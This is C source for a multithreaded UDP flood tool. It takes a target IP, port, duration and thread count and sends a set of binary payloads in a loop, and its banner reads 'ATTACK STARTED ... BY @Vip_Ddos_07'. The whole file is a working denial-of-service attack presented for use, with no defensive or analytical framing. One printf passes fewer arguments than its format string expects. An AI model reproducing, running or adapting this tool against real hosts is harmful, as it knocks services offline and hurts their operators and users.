#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// Function to display usage information
void usage() {
    printf("Usage: ./packet_sender ip port time threads\n");
    exit(1);
}

// Structure to pass data to each thread
struct thread_data {
    char *ip;
    int port;
    int time;
};

// Function that each thread will execute to send packets
void *send_packets(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Example binary payloads (byte arrays)
    unsigned char payloads[][16] = {
        {0xd9, 0x00},
        {0x00, 0x00},
        {0xd9, 0x00, 0x00},
        {0x72, 0xfe, 0x1d, 0x13, 0x00, 0x00},
        {0x05, 0xca, 0x7f, 0x16, 0x9c, 0x11, 0xf9, 0x89},
        {0x30, 0x3a, 0x02, 0x01, 0x03, 0x30, 0x0f, 0x02, 0x02, 0x4a, 0x69, 0x02, 0x03, 0x00, 0x00},
        {0x0d, 0x0a, 0x0d, 0x0a, 0x00, 0x00}
    };

    // Number of payloads
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Calculate end time for the thread
    endtime = time(NULL) + data->time;

    // Keep sending packets until the specified time expires
    while (time(NULL) <= endtime) {
        for (int i = 0; i < num_payloads; i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0, 
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    // Close the socket after sending is done
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    // Parse the command-line arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Validate the number of threads
    if (threads <= 0 || threads > 10000) { // Example limit: max 10,000 threads
        fprintf(stderr, "Please enter a number of threads between 1 and 10000.\n");
        exit(1);
    }

    // Allocate memory for thread IDs
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    // Print attack information
    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    // Create threads for sending packets
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("ATTACK STARTED ON%s:%d for %d seconds with %d threads BY @Vip_Ddos_07\n", thread_ids[i]);
    }

    // Wait for all threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Free allocated memory and print completion message
    free(thread_ids);
    printf("Packet sending finished.\n");
    return 0;
}